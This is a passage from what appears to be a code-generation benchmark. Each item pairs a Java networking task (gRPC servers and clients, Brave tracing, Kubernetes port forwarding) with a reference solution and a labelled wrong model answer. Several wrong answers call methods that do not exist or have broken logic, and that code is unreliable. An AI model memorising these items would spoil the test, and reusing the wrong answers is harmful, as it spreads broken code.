break;\n                }\n            } catch (StatusRuntimeException e) {\n                attempts++;\n                if (attempts >= retry) {\n                    throw e;\n                }\n                resetStub();\n            }\n        }\n    }\n\n    public void close() {\n        for (ManagedChannel ch : chs.values()) {\n            closeChannel(ch);\n        }\n        chs.clear();\n        if (channel != null && !channel.isShutdown()) {\n            channel.shutdownNow();\n        }\n    }\n\n    public void closeChannel(ManagedChannel channel) {\n        if (channel != null && !channel.isShutdown()) {\n            channel.shutdownNow();\n        }\n    }\n\n    static class KVPair<K, V> {\n        private K key;\n        private V value;\n\n        public KVPair(K key, V value) {\n            this.key = key;\n            this.value = value;\n        }\n\n        public K getKey() {\n            return key;\n        }\n\n        public void setKey(K key) {\n            this.key = key;\n        }\n\n        public V getValue() {\n            return value;\n        }\n\n        public void setValue(V value) {\n            this.value = value;\n        }\n    }\n\n    interface PDConfig {\n        Set<String> getHosts();\n        int getTimeout();\n    }\n\n    static class BytesMarshaller<T> implements Marshaller<T> {\n        @Override\n        public InputStream stream(T value) {\n            return new ByteArrayInputStream(new byte[0]);\n        }\n\n        @Override\n        public T parse(InputStream stream) {\n            return null;\n        }\n    }\n\n    abstract class AbstractClientStubProxy {\n        public abstract Object getStubInstance();\n    }\n}\n```"
  },
  {
    "Task_id": 504,
    "Instruction": "Task Description: Implement a function to test the gRPC Server Reflection service by establishing a connection to a gRPC server, sending a reflection request, and processing the response.\n\nFunction Description: The function connects to a gRPC server running on localhost at port 9090 using plaintext communication. It creates an asynchronous stub for the Server Reflection service, sends a request to list all available services, and processes the response. The function ensures proper cleanup by shutting down the channel after completion.\n\nInput: None (The target server address is hardcoded as \"localhost:9090\")\n\nOutput: None (The function processes the reflection response internally via the checkResult method, which is not shown in the reference code)",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc;\nimport io.grpc.reflection.v1alpha.ServerReflectionGrpc.ServerReflectionStub;\nimport io.grpc.reflection.v1alpha.ServerReflectionRequest;\nimport io.grpc.reflection.v1alpha.ServerReflectionResponse;\nimport io.grpc.stub.StreamObserver;\n\nvoid testReflectionService() {\n    final ManagedChannel channel = ManagedChannelBuilder.forTarget(\"localhost:9090\").usePlaintext().build();\n    try {\n        final ServerReflectionStub stub = ServerReflectionGrpc.newStub(channel);\n\n        final AwaitableStreamObserver<ServerReflectionResponse> resultObserver = new AwaitableStreamObserver<>();\n        final StreamObserver<ServerReflectionRequest> requestObserver = stub.serverReflectionInfo(resultObserver);\n        requestObserver.onNext(ServerReflectionRequest.newBuilder()\n                .setListServices(\"\")\n                .build());\n        requestObserver.onCompleted();\n        checkResult(resultObserver);\n    } finally {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 23,
    "wrong_result": "```python\nimport grpc\nimport asyncio\nfrom grpc_reflection.v1alpha import reflection_pb2\nfrom grpc_reflection.v1alpha import reflection_pb2_grpc\n\nasync def test_reflection_service():\n    channel = grpc.aio.insecure_channel('localhost:9090')\n    stub = reflection_pb2_grpc.ServerReflectionStub(channel)\n    \n    request = reflection_pb2.ServerReflectionRequest(\n        host='localhost',\n        message_request=reflection_pb2.ListServicesRequest()\n    )\n    \n    response = await stub.ServerReflectionInfo((request,))\n    async for resp in response:\n        # Assuming checkResult is a function that processes the reflection response\n        checkResult(resp)\n\n    await channel.close()\n\ndef checkResult(result):\n    pass  # Implementation not provided\n\nif __name__ == '__main__':\n    asyncio.run(test_reflection_service())\n```"
  },
  {
    "Task_id": 507,
    "Instruction": "Task Description: Create a gRPC server in Java that can handle multiple services, manage interceptors, and provide service discovery capabilities.\n\nClass Description: The GrpcServer class is responsible for initializing and managing a gRPC server instance. It handles server configuration, service registration, interceptor management, and provides methods for service discovery. The server can be started and stopped gracefully, and it maintains mappings of services and methods for lookup purposes.\n\nAttributes:\n- server: [Server] - The gRPC server instance\n- serviceNameMap: [Map<String, Class<? extends BindableService>>] - Mapping of service names to their implementation classes\n- fullMethodNameMap: [Map<String, Method>] - Mapping of full method names to their corresponding Method objects\n\nMethods:\n- GrpcServer: [Constructor](GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) -> [void] - Initializes the server with given properties, interceptors and services\n- GrpcServer: [Constructor](ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) -> [void] - Alternative constructor accepting a pre-configured ServerBuilder\n- isRunning: [isRunning]() -> [boolean] - Checks if the server is currently running\n- port: [port]() -> [int] - Returns the port number the server is listening on\n- findClass: [findClass](ServiceDescriptor descriptor) -> [Class<? extends BindableService>] - Finds the implementation class for a given service descriptor\n- findMethod: [findMethod](MethodDescriptor<?, ?> descriptor) -> [Method] - Finds the Method object for a given method descriptor\n- resolve: [resolve](MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) -> [Method] - Resolves the Method object for a given method descriptor within a service class\n- onApplicationStart: [onApplicationStart]() -> [void] - Starts the server and begins awaiting termination\n- onApplicationStop: [onApplicationStop]() -> [void] - Shuts down the server gracefully",
    "Canonical_solution": "import io.grpc.BindableService;\nimport io.grpc.MethodDescriptor;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerMethodDefinition;\nimport io.grpc.ServerServiceDefinition;\nimport io.grpc.ServiceDescriptor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.ListIterator;\nimport java.util.Map;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport org.ballcat.common.core.compose.ContextComponent;\nimport org.ballcat.common.thread.ThreadPool;\nimport org.ballcat.common.util.ClassUtils;\nimport org.ballcat.grpc.server.properties.GrpcServerProperties;\nimport org.springframework.core.annotation.AnnotationAwareOrderComparator;\n\npublic class GrpcServer implements ContextComponent {\n\n    private final Server server;\n    private final Map<String, Class<? extends BindableService>> serviceNameMap;\n    private final Map<String, Method> fullMethodNameMap;\n\n    public GrpcServer(GrpcServerProperties properties, List<ServerInterceptor> interceptors,\n            List<BindableService> services) {\n        this(ServerBuilder.forPort(properties.getPort()), properties, interceptors, services);\n    }\n\n    public GrpcServer(ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors,\n            List<BindableService> services) {\n        builder\n            .maxInboundMessageSize((int) properties.getMessageSize().toBytes())\n            .keepAliveTime(properties.getKeepAliveTime(), TimeUnit.MILLISECONDS)\n            .keepAliveTimeout(properties.getKeepAliveTimeout(), TimeUnit.MILLISECONDS);\n\n        interceptors.sort(AnnotationAwareOrderComparator.INSTANCE);\n        ListIterator<ServerInterceptor> iterator = interceptors.listIterator(interceptors.size());\n        while (iterator.hasPrevious()) {\n            builder.intercept(iterator.previous());\n        }\n\n        this.serviceNameMap = new HashMap<>();\n        this.fullMethodNameMap = new HashMap<>();\n\n        for (BindableService service : services) {\n            builder.addService(service);\n            Class<? extends BindableService> cls = service.getClass();\n            ServerServiceDefinition serverServiceDefinition = service.bindService();\n            ServiceDescriptor serviceDescriptor = serverServiceDefinition.getServiceDescriptor();\n\n            this.serviceNameMap.put(serviceDescriptor.getName(), cls);\n\n            for (ServerMethodDefinition<?, ?> serverMethodDefinition : serverServiceDefinition.getMethods()) {\n                MethodDescriptor<?, ?> methodDescriptor = serverMethodDefinition.getMethodDescriptor();\n                String fullMethodName = methodDescriptor.getFullMethodName();\n                this.fullMethodNameMap.put(fullMethodName, resolve(methodDescriptor, cls));\n            }\n        }\n\n        this.server = builder.build();\n    }\n\n    public boolean isRunning() {\n        return !this.server.isShutdown() && !this.server.isTerminated();\n    }\n\n    public int port() {\n        return this.server.getPort();\n    }\n\n    public Class<? extends BindableService> findClass(ServiceDescriptor descriptor) {\n        return this.serviceNameMap.get(descriptor.getName());\n    }\n\n    public Method findMethod(MethodDescriptor<?, ?> descriptor) {\n        return this.fullMethodNameMap.get(descriptor.getFullMethodName());\n    }\n\n    protected Method resolve(MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) {\n        String bareMethodName = descriptor.getBareMethodName();\n        for (Method method : ClassUtils.methods(cls)) {\n            if (Objects.equals(method.getName(), bareMethodName)) {\n                return method;\n            }\n        }\n        return null;\n    }\n\n    public void onApplicationStart() {\n        this.server.start();\n        ThreadPool.instance().execute(\"GrpcServer\", this.server::awaitTermination);\n    }\n\n    public void onApplicationStop() {\n        this.server.shutdownNow();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "```java\nimport io.grpc.*;\nimport io.grpc.netty.NettyServerBuilder;\nimport java.lang.reflect.Method;\nimport java.util.*;\n\npublic class GrpcServer {\n    private final Server server;\n    private final Map<String, Class<? extends BindableService>> serviceNameMap = new HashMap<>();\n    private final Map<String, Method> fullMethodNameMap = new HashMap<>();\n\n    public GrpcServer(GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) {\n        this(createDefaultBuilder(properties.getPort()), properties, interceptors, services);\n    }\n\n    public GrpcServer(ServerBuilder<?> builder, GrpcServerProperties properties, List<ServerInterceptor> interceptors, List<BindableService> services) {\n        if (interceptors != null) {\n            for (ServerInterceptor interceptor : interceptors) {\n                builder.intercept(interceptor);\n            }\n        }\n\n        if (services != null) {\n            for (BindableService service : services) {\n                String serviceName = ServiceDescriptor.generateFullServiceName(service.getClass());\n                serviceNameMap.put(serviceName, service.getClass());\n                builder.addService(new DynamicBindableService(service));\n            }\n        }\n\n        this.server = builder.build();\n    }\n\n    private static ServerBuilder<?> createDefaultBuilder(int port) {\n        return NettyServerBuilder.forPort(port);\n    }\n\n    public boolean isRunning() {\n        return server.isStarted() && !server.isShutdown();\n    }\n\n    public int port() {\n        return server.getPort();\n    }\n\n    public Class<? extends BindableService> findClass(ServiceDescriptor descriptor) {\n        return serviceNameMap.get(descriptor.getFullName());\n    }\n\n    public Method findMethod(MethodDescriptor<?, ?> descriptor) {\n        return fullMethodNameMap.get(descriptor.getFullMethodName());\n    }\n\n    private Method resolve(MethodDescriptor<?, ?> descriptor, Class<? extends BindableService> cls) {\n        try {\n            return cls.getMethod(\n                    descriptor.getBareMethodName(),\n                    getRequestType(descriptor),\n                    getResponseType(descriptor)\n            );\n        } catch (NoSuchMethodException e) {\n            throw new RuntimeException(\"Method not found\", e);\n        }\n    }\n\n    private Class<?> getRequestType(MethodDescriptor<?, ?> descriptor) {\n        return descriptor.getRequestType().getClass();\n    }\n\n    private Class<?> getResponseType(MethodDescriptor<?, ?> descriptor) {\n        return descriptor.getResponseType().getClass();\n    }\n\n    public void onApplicationStart() {\n        try {\n            server.start();\n            System.out.println(\"gRPC server started on port \" + port());\n            server.awaitTermination();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start gRPC server\", e);\n        }\n    }\n\n    public void onApplicationStop() {\n        try {\n            server.shutdownNow();\n            server.awaitTermination();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    private class DynamicBindableService implements BindableService {\n        private final BindableService delegate;\n\n        public DynamicBindableService(BindableService delegate) {\n            this.delegate = delegate;\n        }\n\n        @Override\n        public <T extends ServerServiceDefinition> T bindService() {\n            return delegate.bindService();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 509,
    "Instruction": "Task Description: Create a gRPC server in Java that handles incoming requests with configurable delays and traces request contexts using Brave propagation. The server should intercept calls to collect headers and propagation data, and allow for graceful shutdown.\n\nClass Description: TestServer is a gRPC server implementation that intercepts incoming calls to collect tracing information and headers. It supports configurable response delays and maintains queues for request processing.\n\nAttributes:\n- delayQueue: BlockingQueue<Long> - Queue for storing artificial delay durations (milliseconds) to be applied to requests\n- headers: BlockingQueue<Metadata> - Queue for storing metadata headers from incoming requests\n- requests: BlockingQueue<TraceContextOrSamplingFlags> - Queue for storing extracted trace contexts from requests\n- extractor: Extractor<GrpcServerRequest> - Brave propagation extractor for trace context extraction\n- server: Server - The gRPC server instance\n\nMethods:\n- TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) -> void - Constructor that initializes the server with propagation configuration\n- start() -> void - Starts the gRPC server\n- stop() -> void - Stops the server gracefully and awaits termination\n- port() -> int - Returns the port number the server is listening on\n- takeRequest() -> TraceContextOrSamplingFlags - Retrieves the next request context from the queue (waits up to 3 seconds)\n- enqueueDelay(long millis) -> void - Adds a delay duration to be applied to the next request",
    "Canonical_solution": "import brave.propagation.Propagation;\nimport brave.propagation.TraceContext.Extractor;\nimport brave.propagation.TraceContextOrSamplingFlags;\nimport io.grpc.Metadata;\nimport io.grpc.Metadata.Key;\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport io.grpc.ServerCall;\nimport io.grpc.ServerCall.Listener;\nimport io.grpc.ServerCallHandler;\nimport io.grpc.ServerInterceptor;\nimport io.grpc.ServerInterceptors;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\nclass TestServer {\n  static final Key<String> CUSTOM_KEY = Key.of(\"custom\", Metadata.ASCII_STRING_MARSHALLER);\n  final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n  final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n  final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n  final Extractor<GrpcServerRequest> extractor;\n  final Server server;\n\n  TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n    extractor = propagation.extractor(GrpcServerRequest::propagationField);\n    server = ServerBuilder.forPort(PickUnusedPort.get())\n        .addService(ServerInterceptors.intercept(\n            new GreeterImpl(null),\n            new ServerInterceptor() {\n              @Override\n              public <ReqT, RespT> Listener<ReqT> interceptCall(ServerCall<ReqT, RespT> call,\n                  Metadata headers, ServerCallHandler<ReqT, RespT> next) {\n                Long delay = delayQueue.poll();\n                if (delay != null) {\n                  try {\n                    Thread.sleep(delay);\n                  } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    throw new AssertionError(\"interrupted sleeping \" + delay);\n                  }\n                }\n                TestServer.this.headers.add(headers);\n                requests.add(extractor.extract(new GrpcServerRequest(nameToKey, call, headers)));\n                return next.startCall(new SimpleForwardingServerCall<ReqT, RespT>(call) {\n                  @Override public void sendHeaders(Metadata headers) {\n                    headers.put(CUSTOM_KEY, \"brave\");\n                    super.sendHeaders(headers);\n                  }\n                }, headers);\n              }\n            }))\n        .build();\n  }\n\n  void start() throws IOException {\n    server.start();\n  }\n\n  void stop() {\n    server.shutdown();\n    try {\n      server.awaitTermination();\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  int port() {\n    return server.getPort();\n  }\n\n  TraceContextOrSamplingFlags takeRequest() {\n    try {\n      return requests.poll(3, TimeUnit.SECONDS);\n    } catch (InterruptedException e) {\n      Thread.currentThread().interrupt();\n      throw new AssertionError(e);\n    }\n  }\n\n  void enqueueDelay(long millis) {\n    this.delayQueue.add(millis);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "```java\nimport io.grpc.*;\nimport io.grpc.netty.NettyServerBuilder;\nimport brave.propagation.Extractor;\nimport brave.propagation.Propagation;\nimport brave.propagation.TraceContext;\n\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestServer {\n    private final BlockingQueue<Long> delayQueue = new LinkedBlockingQueue<>();\n    private final BlockingQueue<Metadata> headers = new LinkedBlockingQueue<>();\n    private final BlockingQueue<TraceContextOrSamplingFlags> requests = new LinkedBlockingQueue<>();\n    private final Extractor<GrpcServerRequest> extractor;\n    private Server server;\n    private final int port = 50051;\n\n    public TestServer(Map<String, Key<String>> nameToKey, Propagation<String> propagation) {\n        this.extractor = propagation.extractionAdapter(GrpcServerRequest.create(nameToKey));\n    }\n\n    public void start() throws IOException {\n        server = NettyServerBuilder.forPort(port)\n            .addService(new AbstractService())\n            .intercept(new ServerInterceptor() {\n                @Override\n                public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(\n                    ServerCall<ReqT, RespT> call,\n                    Metadata headers,\n                    ServerCallHandler<ReqT, RespT> next) {\n                    TraceContextOrSamplingFlags extracted = extractor.extract(headers);\n                    requests.add(extracted);\n                    TestServer.this.headers.add(headers);\n\n                    return new ForwardingServerCallListener.SimpleForwardingServerCallListener<>(next.startCall(call, headers)) {\n                        @Override\n                        public void onHalfClose() {\n                            try {\n                                Long delay = delayQueue.poll(3, TimeUnit.SECONDS);\n                                if (delay != null) {\n                                    Thread.sleep(delay);\n                                }\n                            } catch (InterruptedException e) {\n                                Thread.currentThread().interrupt();\n                            }\n                            super.onHalfClose();\n                        }\n                    };\n                }\n            })\n            .build()\n            .start();\n\n        System.out.println(\"Server started on port \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(this::stop));\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.shutdown();\n            try {\n                server.awaitTermination(30, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public int port() {\n        return port;\n    }\n\n    public TraceContextOrSamplingFlags takeRequest() throws InterruptedException {\n        return requests.poll(3, TimeUnit.SECONDS);\n    }\n\n    public void enqueueDelay(long millis) {\n        delayQueue.add(millis);\n    }\n\n    private static class GrpcServerRequest implements Propagation.Getter<ServerCall<?, ?>, String> {\n        private final Map<String, Key<String>> nameToKey;\n\n        static <K> GrpcServerRequest create(Map<String, K> nameToKey) {\n            return new GrpcServerRequest((Map<String, Key<String>>) nameToKey);\n        }\n\n        GrpcServerRequest(Map<String, Key<String>> nameToKey) {\n            this.nameToKey = nameToKey;\n        }\n\n        @Override\n        public String get(ServerCall<?, ?> carrier, String key) {\n            Key<String> k = nameToKey.get(key);\n            return k == null ? null : k.toString();\n        }\n    }\n\n    private static abstract class ForwardingServerCallListener<ReqT> extends ServerCall.Listener<ReqT> {\n        protected abstract ServerCall.Listener<ReqT> delegate();\n\n        @Override\n        public void onMessage(ReqT message) {\n            delegate().onMessage(message);\n        }\n\n        @Override\n        public void onHalfClose() {\n            delegate().onHalfClose();\n        }\n\n        @Override\n        public void onCancel() {\n            delegate().onCancel();\n        }\n\n        @Override\n        public void onComplete() {\n            delegate().onComplete();\n        }\n\n        @Override\n        public void onReady() {\n            delegate().onReady();\n        }\n\n        public static class SimpleForwardingServerCallListener<ReqT> extends ForwardingServerCallListener<ReqT> {\n            private final ServerCall.Listener<ReqT> delegate;\n\n            SimpleForwardingServerCallListener(ServerCall.Listener<ReqT> delegate) {\n                this.delegate = delegate;\n            }\n\n            @Override\n            protected ServerCall.Listener<ReqT> delegate() {\n                return delegate;\n            }\n        }\n    }\n\n    private static class AbstractService extends ServerServiceDefinition {\n        @Override\n        public String getName() {\n            return \"TestService\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 514,
    "Instruction": "Task Description: Implement a gRPC server in Java that listens on a specified port, provides a service, and handles graceful shutdown.\n\nClass Description: The ShelfServer class is responsible for creating and managing a gRPC server instance. It initializes the server on a specified port, adds the required service implementation, and provides methods for starting, stopping, and waiting for server termination.\n\nAttributes:\n- server: [io.grpc.Server] - The gRPC server instance that handles incoming requests\n- logger: [java.util.logging.Logger] - Logger instance for server status messages\n\nMethods:\n- start() -> [void] - Starts the gRPC server on the specified port (50052 by default) and registers a shutdown hook for graceful termination. Throws IOException if server fails to start.\n- stop() -> [void] - Initiates a graceful shutdown of the gRPC server if it's running\n- blockUntilShutdown() -> [void] - Blocks the calling thread until the server terminates. Throws InterruptedException if the thread is interrupted while waiting\n- main(String[] args) -> [void] - Entry point that creates and starts the server instance. Throws IOException and InterruptedException for server start and shutdown operations",
    "Canonical_solution": "import io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n  private static final Logger logger = Logger.getLogger(ShelfServer.class.getName());\n\n  private Server server;\n\n  private void start() throws IOException {\n    int port = 50052;\n    server = ServerBuilder.forPort(port).addService(new ShelfService()).build().start();\n    logger.info(\"Server started, listening on \" + port);\n    Runtime.getRuntime()\n        .addShutdownHook(\n            new Thread(\n                () -> {\n                  System.err.println(\"*** shutting down gRPC server since JVM is shutting down\");\n                  ShelfServer.this.stop();\n                  System.err.println(\"*** server shut down\");\n                }));\n  }\n\n  private void stop() {\n    if (server != null) {\n      server.shutdown();\n    }\n  }\n\n  private void blockUntilShutdown() throws InterruptedException {\n    if (server != null) {\n      server.awaitTermination();\n    }\n  }\n\n  public static void main(String[] args) throws IOException, InterruptedException {\n    final ShelfServer server = new ShelfServer();\n    server.start();\n    server.blockUntilShutdown();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 24,
    "wrong_result": "```java\nimport io.grpc.Server;\nimport io.grpc.ServerBuilder;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class ShelfServer {\n    private static final Logger logger = Logger.getLogger(ShelfServer.class.getName());\n    private Server server;\n\n    private int port = 50052;\n\n    private void start() throws IOException {\n        server = ServerBuilder.forPort(port)\n                .build()\n                .start();\n        logger.info(\"Server started, listening on \" + port);\n        Runtime.getRuntime().addShutdownHook(new Thread(this::stop));\n    }\n\n    private void stop() {\n        if (server != null) {\n            server.shutdown();\n            logger.info(\"Server stopping gracefully...\");\n        }\n    }\n\n    private void blockUntilShutdown() throws InterruptedException {\n        if (server != null) {\n            server.awaitTermination();\n        }\n    }\n\n    public static void main(String[] args) throws IOException, InterruptedException {\n        final ShelfServer server = new ShelfServer();\n        server.start();\n        server.blockUntilShutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 521,
    "Instruction": "Task Description: Create a Java class that implements Kubernetes port forwarding functionality, allowing local ports to be forwarded to target ports in a Kubernetes pod. The class should handle multiple port forwards simultaneously and provide error handling capabilities.\n\nClass Description: KubectlPortForward is a Kubernetes client utility that establishes TCP port forwarding between local ports and target ports in a specified pod. It extends Kubectl's ResourceAndContainerBuilder and implements Executable<Boolean> interface. The class manages multiple port forwarding connections in separate threads and provides shutdown capability.\n\nAttributes:\n- localPorts: List<Integer> - Stores local port numbers to be forwarded\n- targetPorts: List<Integer> - Stores target port numbers in the pod\n- running: boolean - Flag indicating whether port forwarding is active\n- onUnhandledError: Consumer<Throwable> - Callback for handling uncaught exceptions\n\nMethods:\n- ports(int localPort, int targetPort) -> KubectlPortForward - Adds a port forwarding pair (local and target ports)\n- onUnhandledError(Consumer<Throwable> onUnhandledError) -> KubectlPortForward - Sets the error handler callback\n- execute() -> Boolean - Starts the port forwarding operation (implements Kubectl.Executable)\n- shutdown() -> void - Stops all port forwarding operations\n- executeInternal() -> void - Internal implementation of port forwarding (throws ApiException, KubectlException, IOException, InterruptedException)\n- portForward(PortForward pf, ServerSocket server, int targetPort) -> Thread - Creates and starts a thread for a single port forwarding connection\n- copyAsync(InputStream, OutputStream, Consumer<Throwable>) -> Thread - Helper method for asynchronous stream copying (not shown in reference code)",
    "Canonical_solution": "import io.kubernetes.client.PortForward;\nimport io.kubernetes.client.extended.kubectl.Kubectl;\nimport io.kubernetes.client.extended.kubectl.exception.KubectlException;\nimport io.kubernetes.client.openapi.ApiException;\nimport io.kubernetes.client.openapi.models.V1Pod;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class KubectlPortForward\n    extends Kubectl.ResourceAndContainerBuilder<V1Pod, KubectlPortForward>\n    implements Kubectl.Executable<Boolean> {\n  private List<Integer> localPorts;\n  private List<Integer> targetPorts;\n  private boolean running;\n  private Consumer<Throwable> onUnhandledError = Throwable::printStackTrace;\n\n  public KubectlPortForward() {\n    super(V1Pod.class);\n    localPorts = new ArrayList<>();\n    targetPorts = new ArrayList<>();\n  }\n\n  public KubectlPortForward ports(int localPort, int targetPort) {\n    localPorts.add(localPort);\n    targetPorts.add(targetPort);\n    return this;\n  }\n\n  public KubectlPortForward onUnhandledError(Consumer<Throwable> onUnhandledError) {\n    this.onUnhandledError = onUnhandledError;\n    return this;\n  }\n\n  @Override\n  public Boolean execute() throws KubectlException {\n    running = true;\n    try {\n      executeInternal();\n      return true;\n    } catch (ApiException | IOException | InterruptedException ex) {\n      throw new KubectlException(ex);\n    }\n  }\n\n  public void shutdown() {\n    running = false;\n  }\n\n  private void executeInternal()\n      throws ApiException, KubectlException, IOException, InterruptedException {\n    PortForward pf = new PortForward(apiClient);\n    List<Thread> threads = new ArrayList<>();\n    for (int i = 0; i < localPorts.size(); i++) {\n      int targetPort = targetPorts.get(i);\n      threads.add(portForward(pf, new ServerSocket(localPorts.get(i)), targetPort));\n    }\n    for (Thread t : threads) {\n      t.join();\n    }\n  }\n\n  private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n    Thread t = new Thread(\n        () -> {\n          while (running) {\n            try (Socket sock = server.accept()) {\n              PortForward.PortForwardResult result = pf.forward(namespace, name, Arrays.asList(targetPort));\n              if (result == null) {\n                throw new KubectlException(\"PortForward failed!\");\n              }\n              InputStream in = result.getInputStream(targetPort);\n              OutputStream out = result.getOutboundStream(targetPort);\n              Thread t1 = copyAsync(sock.getInputStream(), out, onUnhandledError);\n              Thread t2 = copyAsync(in, sock.getOutputStream(), onUnhandledError);\n\n              t1.join();\n              in.close();\n              t2.join();\n            } catch (Exception ex) {\n              Optional.ofNullable(onUnhandledError)\n                  .orElse(Throwable::printStackTrace)\n                  .accept(ex);\n            }\n          }\n        });\n    t.start();\n    return t;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport io.fabric8.kubernetes.client.KubernetesClient;\nimport io.fabric8.kubernetes.client.dsl.ExecWatch;\nimport io.fabric8.kubernetes.client.dsl.Namespaceable;\nimport io.fabric8.kubernetes.client.dsl.PodResource;\nimport io.fabric8.kubernetes.client.utils.Serialization;\nimport io.fabric8.kubernetes.api.model.Pod;\n\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\nimport java.util.stream.Collectors;\n\npublic class KubectlPortForward extends ResourceAndContainerBuilder<KubectlPortForward> implements Executable<Boolean> {\n    private final List<Integer> localPorts = new ArrayList<>();\n    private final List<Integer> targetPorts = new ArrayList<>();\n    private volatile boolean running = true;\n    private Consumer<Throwable> onUnhandledError;\n\n    public KubectlPortForward(KubernetesClient client) {\n        super(client);\n    }\n\n    public KubectlPortForward ports(int localPort, int targetPort) {\n        this.localPorts.add(localPort);\n        this.targetPorts.add(targetPort);\n        return this;\n    }\n\n    public KubectlPortForward onUnhandledError(Consumer<Throwable> onUnhandledError) {\n        this.onUnhandledError = onUnhandledError;\n        return this;\n    }\n\n    @Override\n    public Boolean execute() {\n        try {\n            executeInternal();\n            return true;\n        } catch (Exception e) {\n            handleException(e);\n            return false;\n        }\n    }\n\n    public void shutdown() {\n        this.running = false;\n    }\n\n    protected void executeInternal() throws ApiException, KubectlException, IOException, InterruptedException {\n        Pod pod = getPod();\n        if (pod == null) {\n            throw new KubectlException(\"Pod not found\");\n        }\n\n        String namespace = getNamespace();\n        String podName = pod.getMetadata().getName();\n\n        for (int i = 0; i < localPorts.size(); i++) {\n            int localPort = localPorts.get(i);\n            int targetPort = targetPorts.get(i);\n\n            ServerSocket serverSocket = new ServerSocket(localPort);\n            System.out.println(\"Listening on port \" + localPort);\n\n            Thread forwardThread = portForward(new PortForward(), serverSocket, targetPort);\n            forwardThread.start();\n        }\n\n        while (running) {\n            Thread.sleep(1000);\n        }\n    }\n\n    private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n        return new Thread(() -> {\n            try {\n                while (running) {\n                    Socket local = server.accept();\n                    if (!running) break;\n\n                    PodResource<Pod> podResource = getClient().pods().inNamespace(getNamespace()).withName(getName());\n                    Namespaceable.Exec exec = podResource.exec();\n\n                    InputStream stdout = exec.inputStream();\n                    OutputStream stdin = exec.outputStream();\n                    InputStream stderr = exec.errorStream();\n                    boolean success = exec.exec(\"sh\", \"-c\", \"nc -zv localhost \" + targetPort);\n\n                    if (success) {\n                        copyAsync(local.getInputStream(), stdin, onUnhandledError);\n                        copyAsync(stdout, local.getOutputStream(), onUnhandledError);\n                        copyAsync(stderr, System.err, onUnhandledError);\n                    } else {\n                        handleException(new IOException(\"Target port \" + targetPort + \" is not reachable\"));\n                    }\n                }\n            } catch (IOException | InterruptedException e) {\n                handleException(e);\n            }\n        });\n    }\n\n    private void handleException(Throwable t) {\n        if (onUnhandledError != null) {\n            onUnhandledError.accept(t);\n        } else {\n            t.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create a function that retrieves content from a given HTTP/HTTPS URL and handles redirects with proper cookie management.\n\nFunction Description: The function establishes an HTTP connection to the specified URL, follows redirects (up to 10 times), maintains cookies during redirects, and returns the input stream of the final response. It handles standard HTTP response codes and supports common request headers.\n\nInput: \n- urlStr: String - The URL string to fetch content from (must start with \"http://\" or \"https://\")\n\nOutput: \n- InputStream - The input stream containing the response data from the final URL after following redirects, or null if:\n  - The URL scheme is not HTTP/HTTPS\n  - An exception occurs during the process\n  - Maximum redirect count (10) is exceeded",
